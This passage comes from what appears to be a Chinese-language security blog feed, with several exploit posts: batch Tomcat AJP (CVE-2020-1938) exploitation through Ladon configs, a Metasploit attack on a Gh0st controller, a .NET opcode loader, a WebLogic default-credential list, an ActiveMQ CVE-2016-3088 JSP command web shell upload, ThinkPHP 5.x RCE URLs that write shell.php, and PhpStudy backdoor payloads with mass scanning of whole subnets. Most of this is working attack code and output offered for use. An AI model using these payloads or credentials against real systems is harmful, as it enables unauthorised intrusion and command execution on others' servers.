<h3 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h3><p>开放AJP端口（默认开放8009）</p>
<h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>apache tomcat 6<br>apache tomcat 7 &lt; 7.0.100<br>apache tomcat 8 &lt; 8.5.51<br>apache tomcat 9 &lt; 9.0.31</p>
<h3 id="扫描框架"><a href="#扫描框架" class="headerlink" title="扫描框架"></a>扫描框架</h3><p>Ladon设计的初衷就是一个多线程扫描框架，主要是为了让使用者能快速批量检测企业内部或外部站点漏洞<br>不管你擅长哪一门语言，只需要实现单一功能，都可以快速进行批量IP、批量URL、批量C段、批量B段等等<br>每当公开或泄露一个新漏洞时，自己要实现多现程以及批量以上功能，重写一份浪费时间，可能会错过时机<br>小内网可能自己写个批量IP.TXT就够用了，但是大的内网几百几千个网段就基本没有工具考虑，如批量C段<br>但是不要慌，无论是多线程，还是批量C段、跨网段等等，Ladon全都帮你考虑好了，只需实现单一功能即可<br>在Ladon的插件中配置INI方式是不需要具备编程能力的，只要会使用工具，即可实现批量调用，非常简单</p>
<h3 id="Ladon配置"><a href="#Ladon配置" class="headerlink" title="Ladon配置"></a>Ladon配置</h3><p>INI配置很简单，只需要两个参数即可。Github上随便找一份EXP，以下我用的是PYTHON版。<br>两种配置方式，一种是编译成EXE丢到目标上运行的，一种是PY脚本方式执行方便本地调式</p>
<h4 id="EXE配置"><a href="#EXE配置" class="headerlink" title="EXE配置"></a>EXE配置</h4><p>cve-2020-1938.ini</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=CVE-2020-1938.exe</span><br><span class="line">arg=-p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure>

<h4 id="PY配置"><a href="#PY配置" class="headerlink" title="PY配置"></a>PY配置</h4><p>cve-2020-1938.ini</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=f:\python\python.exe</span><br><span class="line">arg=CVE-2020-1938.py -p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure>

<h3 id="批量内网"><a href="#批量内网" class="headerlink" title="批量内网"></a>批量内网</h3><p>把开放8009端口的IP放进ip.txt，执行以下命令即可批量扫描<br>当然也可以不扫端口和不扫存活IP，直接ip24.txt扫描批量C段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon cve-2020-1938.ini</span><br></pre></td></tr></table></figure>
<p>以下为内网实战批量检测结果<br><img alt="img" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2020-1938.png"></p>
<h3 id="文件包含RCE"><a href="#文件包含RCE" class="headerlink" title="文件包含RCE"></a>文件包含RCE</h3><p>一定条件下可实现RCE，如有地方实现文件上传，往目标传个exec.jpg,内容如下，执行whoami</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%out.println(<span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(<span class="string">"whoami"</span>).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python CVE-2020-1938.py -p 8009 -f exec.jpg 192.168.1.10 -c 1</span><br><span class="line">Getting resource at ajp13://192.168.1.10:8009/index.jsp</span><br><span class="line">----------------------------</span><br><span class="line">k82003-77562e10\administrator</span><br></pre></td></tr></table></figure>

<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="1-更新到安全版本"><a href="#1-更新到安全版本" class="headerlink" title="1.更新到安全版本"></a>1.更新到安全版本</h4><p>Apache Tomcat 7.0.100<br>Apache Tomcat 8.5.51<br>Apache Tomcat 9.0.31</p>
<h4 id="2-关闭AJP服务"><a href="#2-关闭AJP服务" class="headerlink" title="2.关闭AJP服务"></a>2.关闭AJP服务</h4><p>修改Tomcat配置文件Service.xml,注释掉<br><connector port="8009" protocol="AJP/1.3" redirectport="8443"></connector></p>
<h4 id="3、配置ajp配置"><a href="#3、配置ajp配置" class="headerlink" title="3、配置ajp配置"></a>3、配置ajp配置</h4><p>配置ajp配置中的secretRequired跟secret属性来限制认证</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
]]></content>
      <categories>
        <category>Ladon</category>
      </categories>
      <tags>
        <tag>Exp</tag>
        <tag>Ladon</tag>
      </tags>
  </entry>
  <entry>
    <title>利用Gh0st 3.6远程溢出漏洞反向控制攻击者</title>
    <url>/p/30568.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>漏洞验证在2017年被公开，实际上Gh0st溢出漏洞在2009年时就已被人爆出过多个<br>可见使用开源C2工具，不见得安全，最好是经过二次修改，单纯做免杀可防不了哦</p>
<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>Teston WinXP at 2017-09-15<br>运行Gh0st客户端，然后通过MSF溢出C2客户端机器，即可反向获取攻击者机器权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/windows/misc/gh0st</span><br><span class="line">msf exploit(gh0st) &gt; <span class="built_in">set</span> RHOST 192.168.1.126</span><br><span class="line">RHOST =&gt; 192.168.1.126</span><br><span class="line">msf exploit(gh0st) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.125:4444 </span><br><span class="line">[*] 192.168.1.126:80 - Trying target Gh0st Beta 3.6</span><br><span class="line">[*] 192.168.1.126:80 - Spraying heap...</span><br><span class="line">[*] 192.168.1.126:80 - Trying <span class="built_in">command</span> 103...</span><br><span class="line">[*] Sending stage (957999 bytes) to 192.168.1.126</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.125:4444 -&gt; 192.168.1.126:1070) at 2017-09-15 16:22:56 +0800</span><br><span class="line">[*] 192.168.1.126:80 - Server closed connection</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : K8ANTI-B2B9B81C</span><br><span class="line">OS              : Windows XP (Build 2600, Service Pack 3).</span><br><span class="line">Architecture    : x86</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p><a href="https://github.com/rapid7/metasploit-framework/blob/be66ed8af3c355b1280e1a2bdbe5dd1a74e7bc58/modules/exploits/windows/misc/gh0st.rb" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/blob/be66ed8af3c355b1280e1a2bdbe5dd1a74e7bc58/modules/exploits/windows/misc/gh0st.rb</a></p>
<p><a href="https://github.com/rapid7/metasploit-framework/files/1243297/0efd83a87d2f5359fae051517fdf4eed8972883507fbd3b5145c3757f085d14c.zip" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/files/1243297/0efd83a87d2f5359fae051517fdf4eed8972883507fbd3b5145c3757f085d14c.zip</a></p>
]]></content>
      <categories>
        <category>Exp</category>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
        <tag>Overflow</tag>
        <tag>Gh0st</tag>
      </tags>
  </entry>
  <entry>
    <title>.NET版“ShellCode”编写</title>
    <url>/p/40249.html</url>
    <content><![CDATA[<h3 id="0x000-前言"><a href="#0x000-前言" class="headerlink" title="0x000 前言"></a>0x000 前言</h3><p>近几年大家都喜欢用CS来进行后渗透，所以对于ShellCode大家应该不会陌生。<br>但是可能很多人并不懂CS它的功能是什么,CS生成的ShellCode是一段下载者。<br>主要功能为下载becon.dll，然后内存加载，我们所用的相关功能都在becon里。<br>ShellCode可能采用汇编或VC编写后转成机器码提取关键机器码，优势在于体积小<br>体积小就可以直接结合漏洞使用，什么Word文档、MS17010溢出、IE漏洞挂马等<br>都可以直接结合CS来使用，直接CS上线，而不是非要先做其它操作再植入CS。<br>网上关于汇编或VC编写ShellCode的文章很多，但是.NET的”ShellCode”很少见<br>本文将教大家如何用操作码实现.NET版”ShellCode”的编写。</p>
<h3 id="0x001-指令、操作码、字节码"><a href="#0x001-指令、操作码、字节码" class="headerlink" title="0x001 指令、操作码、字节码"></a>0x001 指令、操作码、字节码</h3><p>在正式开始前，先给大家科普一下指令、操作码、机器码等的区别</p>
<p>指令: 命令cpu干什么,是由操作码字段和地址码字段(操作数字段)组成</p>
<p>操作码(Opcode): 就是执行某种操作的命令代码</p>
<p>BYTECODE(字节码）：与机器代码相同,除了它主要由基于软件的解释器(如Java或CLR)使用</p>
<p>程序集：有两个“程序集” – 一个汇编程序是一系列的助记符和操作数,它们被馈送到“汇编程序”,<br>“汇编程序”将助记符和操作数“汇编成可执行的机器代码”.可选地,“链接器”链接组件并生成可执行文件.</p>
<p>CLR语言：(.NET语言)中的第二个“程序集”是一系列CLR代码,其中注入了元数据信息,可执行代码库,但不能直接执行.</p>
<h3 id="0x002-Payload-ShellCode"><a href="#0x002-Payload-ShellCode" class="headerlink" title="0x002 Payload ShellCode"></a>0x002 Payload ShellCode</h3><p>机器码(溢出常用的ShellCode): 就是指令的二进制代码(包括操作码和地址码)，功能打开和关闭计算机中的开关的数字序列,以执行某些工作 – 例如增加数字,分支,乘法等等.这是纯机器特有的,由处理器的实现者.</p>
<p>K8理解的ShellCode是子弹，用枪发射(好比处理器执行); 无论你用的是哪种子弹(ShellCode)，都是用枪来射(处理器执行)。</p>
<p>Payload: K8的理解是弹药，弹药可装填到弹壳里用，也可直接点然，也可圈起来当成炮仗点燃，但是弹药不能直接被枪发射。</p>
<p>PS：发现很多搞安全的对很多概念搞混，如很多文章常把payload和shellcode混为一谈<br>看了以上释义，您应该了解明显shellcode只是payload中的一种了，不可能属于同一个。<br>很多人把操作码误解为ShellCode还可以理解，起码长得像还有点类似，但真不是。<br>不要看到二进制、16进制或者byte数组就说是shellcode，长得像人都不定是人呢。</p>
<h3 id="0x003-NET函数代码"><a href="#0x003-NET函数代码" class="headerlink" title="0x003 .NET函数代码"></a>0x003 .NET函数代码</h3><p>.NET包含多种语言，这里我使用C#的代码做为例子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public int Add(int x, int y)</span><br><span class="line">&#123;</span><br><span class="line">    x &#x3D; x * y;</span><br><span class="line">    return x  + y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x003-反汇编得到IL指令"><a href="#0x003-反汇编得到IL指令" class="headerlink" title="0x003 反汇编得到IL指令"></a>0x003 反汇编得到IL指令</h3><p>指令速查表：<a href="https://www.jb51.net/article/86802.htm" target="_blank" rel="noopener">https://www.jb51.net/article/86802.htm</a><br>IL语言，可理解为.NET的汇编,无论你使用的是C#还是VB.NET或者F#开发功能，都可以将其反编译成IL代码。使用ildasm.exe工具反编译，可以看到IL代码和汇编差不多，可能是常用.NET吧，感觉比汇编简单好多。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  &#x2F;&#x2F; Method begins at RVA 0x2170</span><br><span class="line">  &#x2F;&#x2F; Code size       9 (0x9)</span><br><span class="line">  .maxstack  8</span><br><span class="line">  IL_0000:  &#x2F;* 03   |                  *&#x2F; ldarg.1</span><br><span class="line">  IL_0001:  &#x2F;* 04   |                  *&#x2F; ldarg.2</span><br><span class="line">  IL_0002:  &#x2F;* 5A   |                  *&#x2F; mul</span><br><span class="line">  IL_0003:  &#x2F;* 10   | 01               *&#x2F; starg.s    x</span><br><span class="line">  IL_0005:  &#x2F;* 03   |                  *&#x2F; ldarg.1</span><br><span class="line">  IL_0006:  &#x2F;* 04   |                  *&#x2F; ldarg.2</span><br><span class="line">  IL_0007:  &#x2F;* 58   |                  *&#x2F; add</span><br><span class="line">  IL_0008:  &#x2F;* 2A   |                  *&#x2F; ret</span><br><span class="line">&#125; &#x2F;&#x2F; end of method MethodBodyDemo::Add</span><br></pre></td></tr></table></figure>

<h3 id="0x004-IL指令转-NET操作码"><a href="#0x004-IL指令转-NET操作码" class="headerlink" title="0x004 IL指令转.NET操作码"></a>0x004 IL指令转.NET操作码</h3><p>如同VC反汇编提取机器码一样，我们将对应16进制复制出来，然后再对比指令速查表提取关键操作码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x02,0x03,0x5A,0x10,0x00,0x02,0x03,0x58,0x2A</span><br></pre></td></tr></table></figure>

<h3 id="0x005-操作码加载"><a href="#0x005-操作码加载" class="headerlink" title="0x005 操作码加载"></a>0x005 操作码加载</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static Func&lt;int, int, int&gt; LoadByteAssmbly(byte[] bytes)</span><br><span class="line">    &#123;</span><br><span class="line">        var asmName &#x3D; new AssemblyName(&quot;DynamicAssembly&quot;);</span><br><span class="line">        var asmBuilder &#x3D; AppDomain.CurrentDomain.DefineDynamicAssembly(asmName, AssemblyBuilderAccess.RunAndSave);</span><br><span class="line">        var module &#x3D; asmBuilder.DefineDynamicModule(&quot;DynamicModule&quot;);</span><br><span class="line">        var typeBuilder &#x3D; module.DefineType(&quot;DynamicType&quot;);</span><br><span class="line">        var method &#x3D; typeBuilder.DefineMethod(&quot;DynamicMethod&quot;,</span><br><span class="line">            MethodAttributes.Public | MethodAttributes.Static,</span><br><span class="line">            typeof(int),</span><br><span class="line">            new[] &#123; typeof(int), typeof(int) &#125;);</span><br><span class="line">        method.CreateMethodBody(bytes, bytes.Length);</span><br><span class="line">        var type &#x3D; typeBuilder.CreateType();</span><br><span class="line"></span><br><span class="line">        return (Func&lt;int, int, int&gt;)type.GetMethod(&quot;DynamicMethod&quot;).CreateDelegate(typeof(Func&lt;int, int, int&gt;));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x006-执行效果"><a href="#0x006-执行效果" class="headerlink" title="0x006 执行效果"></a>0x006 执行效果</h3><p><img alt="image" data-original="http://k8gege.org/k8img/Other/ilcode.PNG"></p>
]]></content>
      <categories>
        <category>.NET</category>
        <category>源码</category>
        <category>ShellCode</category>
        <category>编程</category>
      </categories>
      <tags>
        <tag>.NET</tag>
        <tag>ShellCode</tag>
        <tag>OpCode</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle WebLogic 默认密码表</title>
    <url>/p/30603.html</url>
    <content><![CDATA[<ol>
<li>Oracle - WebLogic<br>Method    HTTP<br>User ID    system<br>Password    password<br>Level    Administrator</li>
</ol>
<p>Notes    Login located at /console</p>
<ol start="2">
<li>Oracle - WebLogic<br>Method    HTTP<br>User ID    weblogic<br>Password    weblogic<br>Level    Administrator</li>
</ol>
<p>Notes    Login located at /console</p>
<ol start="3">
<li>Oracle - WebLogic<br>Version    9.0 Beta (Diablo)<br>User ID    weblogic<br>Password    weblogic</li>
</ol>
<ol start="4">
<li>Oracle - WebLogic Process Integrator<br>Version    2.0<br>User ID    admin<br>Password    security</li>
</ol>
<ol start="5">
<li>Oracle - WebLogic Process Integrator<br>Version    2.0<br>User ID    joe<br>Password    password</li>
</ol>
<ol start="6">
<li>Oracle - WebLogic Process Integrator<br>Version    2.0<br>User ID    mary<br>Password    password</li>
</ol>
<ol start="7">
<li>Oracle - WebLogic Process Integrator<br>Version    2.0<br>User ID    system<br>Password    security</li>
</ol>
<ol start="8">
<li>Oracle - WebLogic Process Integrator<br>Version    2.0<br>User ID    wlcsystem<br>Password    wlcsystem</li>
</ol>
<ol start="9">
<li>Oracle - WebLogic Process Integrator<br>Version    2.0<br>User ID    wlpisystem<br>Password    wlpisystem</li>
</ol>
]]></content>
      <categories>
        <category>密码</category>
      </categories>
      <tags>
        <tag>Brute</tag>
        <tag>Password</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2016-3088 ActiveMQ GetShell Exploit</title>
    <url>/p/12105.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>使用Exp生成器生成Ladon插件实战，CVE-2016-3088 ActiveMQ GetShell</p>
<h3 id="0x000-漏洞信息"><a href="#0x000-漏洞信息" class="headerlink" title="0x000 漏洞信息"></a>0x000 漏洞信息</h3><p>漏洞编号: CVE-2016-3088<br><br>漏洞原理: ActiveMQ 中的 FileServer 服务允许用户通过 PUT/MOVE方法上传文件到指定目录<br><br>影响版本: Apache ActiveMQ 5.0.0 – 5.13.2<br></p>
<h3 id="0x001-获取路径"><a href="#0x001-获取路径" class="headerlink" title="0x001 获取路径"></a>0x001 获取路径</h3><p>PUT /fileserver/%20/%20<br><br><img alt data-original="http://k8gege.org/k8img/Cscan/expbuild/ActiveMQGetShell1.PNG"></p>
<h3 id="0x002-上传shell"><a href="#0x002-上传shell" class="headerlink" title="0x002 上传shell"></a>0x002 上传shell</h3><p>上传和移动文件需登陆,默认帐密admin/admin,将以下代码双引号进行转义(原本是转义好的被github过滤了)<br><br>PUT<br><br>AddUrl: /fileserver/cmd.jsp<br><br>PUTData: &lt;%@ page import=&quot;java.io.*&quot;%&gt;&lt;%out.print(&quot;Hello&quot;);String strcmd = request.getParameter(&quot;cmd&quot;);String line =null;Process p=Runtime.getRuntime().exec(strcmd);InputStream is = p.getInputStream();BufferedReader br = new BufferedReader(new InputStreamReader(is));while((line =br.readLine())!=null){out.print(line+&quot;&quot;);}%&gt;<br><br>Authorization: admin:admin<br><br><img alt data-original="http://k8gege.org/k8img/Cscan/expbuild/ActiveMQGetShell2.PNG"></p>
<h3 id="0x003-移动shell"><a href="#0x003-移动shell" class="headerlink" title="0x003 移动shell"></a>0x003 移动shell</h3><p>根目录和fileserver均不解析JSP文件,好在admin和api目录可以解析<br><br>MOVE<br><br>AddUrl: /fileserver/cmd.jsp<br><br>Destination: file://C:/Users/null/Desktop/apache-activemq-5.9.0/webapps/admin/cmd.jsp<br><br><img alt data-original="http://k8gege.org/k8img/Cscan/expbuild/ActiveMQGetShell3.PNG"></p>
<h3 id="0x004-Cscan调用"><a href="#0x004-Cscan调用" class="headerlink" title="0x004 Cscan调用"></a>0x004 Cscan调用</h3><p><img alt data-original="http://k8gege.org/k8img/Cscan/expbuild/ActiveMQGetShell4.PNG"></p>
<h3 id="0x005-连接shell"><a href="#0x005-连接shell" class="headerlink" title="0x005 连接shell"></a>0x005 连接shell</h3><p>访问<a href="http://192.168.1.26:8161/admin/shell.jsp?cmd=whoami" target="_blank" rel="noopener">http://192.168.1.26:8161/admin/shell.jsp?cmd=whoami</a><br><br><img alt data-original="http://k8gege.org/k8img/Cscan/expbuild/ActiveMQGetShell5.PNG"></p>
<h3 id="0x006-视频教程"><a href="#0x006-视频教程" class="headerlink" title="0x006 视频教程"></a>0x006 视频教程</h3><p>Video1: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20Apache%20ActiveMQ%20GetShell%20CVE-2016-3088.rar" target="_blank" rel="noopener">K8Cscan Apache ActiveMQ GetShell CVE-2016-3088</a><br><br>Video2: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20WhatCMS%20GetShell.rar" target="_blank" rel="noopener">WhatCMS指纹识别内网ActiveMQ&amp;GetShell</a></p>
]]></content>
      <categories>
        <category>Exp</category>
        <category>工具</category>
        <category>Ladon</category>
      </categories>
      <tags>
        <tag>Exp</tag>
        <tag>Ladon</tag>
        <tag>Tool</tag>
        <tag>GetShell</tag>
        <tag>ActiveMQ</tag>
        <tag>CVE-2016-3088</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP 5.0.22 5.1.29 GetShell Exploit</title>
    <url>/p/26286.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>使用Exp生成器生成Ladon插件实战，ThinkPHP GetShell</p>
<h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><p>使用docker ThinkPHP 5.0.20</p>
<h3 id="复现测试"><a href="#复现测试" class="headerlink" title="复现测试"></a>复现测试</h3><p>Payload:<br><br><a href="http://192.168.1.37:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1" target="_blank" rel="noopener">http://192.168.1.37:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</a><br></p>
<h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p><a href="http://192.168.1.37:8080/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami" target="_blank" rel="noopener">http://192.168.1.37:8080/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</a></p>
<h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><p>GetShell1<br><br><a href="http://192.168.1.37:8080/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo" target="_blank" rel="noopener">http://192.168.1.37:8080/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo</a> 111111&gt;shell.php<br><br>GetShell2<br><br>/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=URL编码内容<br></p>
<h3 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h3><p>通过EXP生成器将以上Payload转成DLL，使用Ladon即可批量利用,详情请观看视频教程<br><br>Video: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20ThinkPHP%205.x%20RCE%20Exploit.rar" target="_blank" rel="noopener">K8Cscan ThinkPHP 5.x RCE Exploit</a><br></p>
]]></content>
      <categories>
        <category>Exp</category>
        <category>工具</category>
        <category>Ladon</category>
      </categories>
      <tags>
        <tag>Exp</tag>
        <tag>Ladon</tag>
        <tag>Tool</tag>
        <tag>GetShell</tag>
        <tag>ThinkPHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Ladon Weblogic CVE-2018-2894</title>
    <url>/p/28875.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>使用Exp生成器生成Ladon插件实战,Weblogic CVE-2018-2894漏洞检测</p>
<h3 id="漏洞扫描-Weblogic-CVE-2018-2894"><a href="#漏洞扫描-Weblogic-CVE-2018-2894" class="headerlink" title="漏洞扫描 Weblogic CVE-2018-2894"></a>漏洞扫描 Weblogic CVE-2018-2894</h3><p>github上有一份weblogic一键检测脚本，发现存在漏洞误报<br><br>看了下代码竟只是判断页面非404，对于返回403,500等误报<br><br>还不如写成200，虽然同样不靠谱，于是Ladon添加此POC检测<br></p>
<h4 id="误报的POC检测脚本"><a href="#误报的POC检测脚本" class="headerlink" title="误报的POC检测脚本"></a>误报的POC检测脚本</h4><p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_0.png"></p>
<h4 id="存在漏洞的页面特征"><a href="#存在漏洞的页面特征" class="headerlink" title="存在漏洞的页面特征"></a>存在漏洞的页面特征</h4><p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_1.png"></p>
<h4 id="EXP生成器生成POC"><a href="#EXP生成器生成POC" class="headerlink" title="EXP生成器生成POC"></a>EXP生成器生成POC</h4><p>使用EXP生成器可简单检测，至少判断页面特征比单纯检测状态更好吧</p>
<p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_2.png"></p>
<h4 id="POC测试"><a href="#POC测试" class="headerlink" title="POC测试"></a>POC测试</h4><p>LadonExp生成的POC可单独使用，也可作为Ladon插件批量检测<br>单独使用: CVE-2018-2894_Poc.exe url<br><br>批量使用: Ladon CVE-2018-2894_Poc.exe (根目录url.txt)<br><br>当然Ladon内置模块WeblogicPoc已添加该漏洞检测<br></p>
<p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_3.png"></p>
]]></content>
      <categories>
        <category>Exp</category>
        <category>工具</category>
        <category>Ladon</category>
      </categories>
      <tags>
        <tag>Exp</tag>
        <tag>Ladon</tag>
        <tag>Tool</tag>
        <tag>GetShell</tag>
        <tag>PhpStudy</tag>
      </tags>
  </entry>
  <entry>
    <title>PhpStudy BackDoor GetShell</title>
    <url>/p/36010.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>使用Exp生成器生成Ladon插件实战,PhpStudy BackDoor GetShell</p>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Cscan Web Exp生成器包含4种提交方法Get/Post/Put/Move,支持16个Http协议参数。<br><br>用户无需编程能力，填写HTTP参数即可生成Web漏洞POC，快速扩展Cscan扫描能力。</p>
<h3 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境<br></h3><p>运行环境：.net 3.5(Win7自带)<br><br>将生成器和Ladon.exe放在同一目录<br></p>
<h3 id="PhpStudy后门为例"><a href="#PhpStudy后门为例" class="headerlink" title="PhpStudy后门为例"></a>PhpStudy后门为例<br></h3><p>该后门利用比较简单，仅需提交两个参数<br><br>Accept-Encoding: gzip,deflate<br><br>Accept-Charset: Base64编码(PHP代码)<br><br><a href="https://github.com/k8gege/PhpStudyDoor" target="_blank" rel="noopener">https://github.com/k8gege/PhpStudyDoor</a><br></p>
<h3 id="0x001-测试POC"><a href="#0x001-测试POC" class="headerlink" title="0x001 测试POC"></a>0x001 测试POC<br></h3><p>打印字符串<br><br>echo “ISDoorOK”;<br><br>K8飞刀Base64编码得到 ZWNobyAiSVNEb29yT0siOw==<br><br>如包含 ISDoorOK ,返回PhpStudyDoor<br></p>
<p>配置<br><br>Accept-Encoding: gzip,deflate<br><br>Accept-Charset: ZWNobyAiSVNEb29yT0siOw==<br></p>
<p>PocTag: ISDoorOK<br><br>PocName: PhpStudyDoor<br></p>
<p>编译测试<br><br>Cscan 5.2<br><br>By K8gege<br><br>load netscan.dll<br><br><a href="http://192.168.1.26" target="_blank" rel="noopener">http://192.168.1.26</a>     PhpStudyDoor<br><br>Finished!<br><br><img alt data-original="http://k8gege.org/k8img/Cscan/expbuild/PhpStudyPoc.PNG"></p>
<h3 id="0x002-利用EXP"><a href="#0x002-利用EXP" class="headerlink" title="0x002 利用EXP"></a>0x002 利用EXP</h3><p>执行whoami命令(可根据需要改成GetShell或反弹)<br><br>echo ‘start’;system(‘whoami’);echo ‘end’;<br></p>
<p>配置<br><br>Accept-Encoding: gzip,deflate<br><br>Accept-Charset: ZWNobyAnc3RhcnQnO3N5c3RlbSgnd2hvYW1pJyk7ZWNobyAnZW5kJzs=<br></p>
<p>编译测试<br><br>Cscan 5.2<br><br>By K8gege<br><br>load netscan.dll<br><br>startwin-4udh62v7dmn\null<br><br>endHello World<br><br>Finished!<br><br><img alt data-original="http://k8gege.org/k8img/Cscan/expbuild/PhpStudyTest.PNG"></p>
<h3 id="0x003-结果提取"><a href="#0x003-结果提取" class="headerlink" title="0x003 结果提取"></a>0x003 结果提取</h3><p>Result勾选替换换行为空格<br><br>正则: (?&lt;=start).*?(?=end)<br><br><img alt data-original="http://k8gege.org/k8img/Cscan/expbuild/PhpStudyExp.PNG"></p>
<h3 id="0x004-批量利用"><a href="#0x004-批量利用" class="headerlink" title="0x004 批量利用"></a>0x004 批量利用</h3><p>为了不被后续Exp覆盖,可将netscan.dll改名为PhpStudyExp.dll<br><br>单个IP检测 Cscan 192.168.1.8 PhpStudyExp.dll<br><br>单个URL检测Cscan <a href="http://192.168.1.8" target="_blank" rel="noopener">http://192.168.1.8</a> PhpStudyExp.dll<br><br>批量C段检测 Cscan 192.168.1.8/24 PhpStudyExp.dll<br><br>批量B段检测 Cscan 192.168.1.8/16 PhpStudyExp.dll<br><br>批量url.txt检测 Cscan PhpStudyExp.dll<br><br>执行结果返回机器IP以及利用结果(执行whoami当前用户)<br><br><img alt data-original="http://k8gege.org/k8img/Cscan/expbuild/PhpStudyCscan.png"></p>
<h3 id="0x005-下载"><a href="#0x005-下载" class="headerlink" title="0x005 下载"></a>0x005 下载</h3><p><a href="https://github.com/k8gege/K8CScan/tree/master/ExpGenerator" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/ExpGenerator</a></p>
]]></content>
      <categories>
        <category>Exp</category>
        <category>工具</category>
        <category>Ladon</category>
      </categories>
      <tags>
        <tag>Exp</tag>
        <tag>Ladon</tag>
        <tag>Tool</tag>
        <tag>GetShell</tag>
        <tag>PhpStudy</tag>
      </tags>
  </entry>
  <entry>
    <title>Ladon Scanner For PowerShell</title>
    <url>/p/673c210e.html</url>
    <content><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/Ladon/Dragon.jpg"></p>
